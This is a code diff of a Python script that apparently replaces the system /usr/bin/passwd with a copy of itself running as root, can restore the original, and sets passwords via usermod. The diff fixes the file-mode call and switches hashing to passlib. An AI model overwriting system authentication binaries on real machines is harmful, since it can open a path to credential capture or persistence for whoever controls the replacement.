@@ -10,6 +10,7 @@ Last Modified: September 19, 2017
 Dev: K4YT3X
 Last Modified: November 4, 2018
 """
+from passlib.hash import sha512_crypt
 import getpass
 import os
 import re
@@ -33,7 +34,7 @@ def replace_original_passwd():
         pass
     shutil.copy(os.path.realpath(__file__), '/usr/bin/passwd')
     shutil.chown('/usr/bin/passwd', user=0, group=0)
-    os.chmod('/usr/bin/passwd', 755)
+    os.chmod('/usr/bin/passwd', 0o755)
 
 
 def restore_original_passwd():
@@ -52,8 +53,7 @@ def restore_original_passwd():
 
 
 def change_password(username, password):
-    output = subprocess.Popen(('mkpasswd', '-m', 'sha-512', password), stdout=subprocess.PIPE)
-    shadow_password = output.communicate()[0].strip()
+    shadow_password = sha512_crypt.encrypt(password)
     subprocess.call(('usermod', '-p', shadow_password, username))
 
 
